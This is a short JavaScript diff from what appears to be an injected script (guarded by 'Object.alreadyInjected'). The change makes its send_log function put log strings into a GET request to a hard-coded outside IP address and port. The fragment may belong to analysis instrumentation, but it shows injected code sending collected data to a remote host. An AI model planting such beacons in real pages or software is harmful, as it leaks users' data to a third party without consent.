@@ -56,9 +56,9 @@ if (Object.alreadyInjected === undefined)
 
     function send_log(log_str) {
         var xhr = new XMLHttpRequest();
-        xhr.open("POST", 'http://1.255.54.63:10921/server', true);
+        xhr.open("GET", 'http://1.255.54.63:10921/' + encodeURI(log_str), true);
         xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-        xhr.send(log_str)
+        xhr.send(null)
     }
 
     function getStackTrace() {
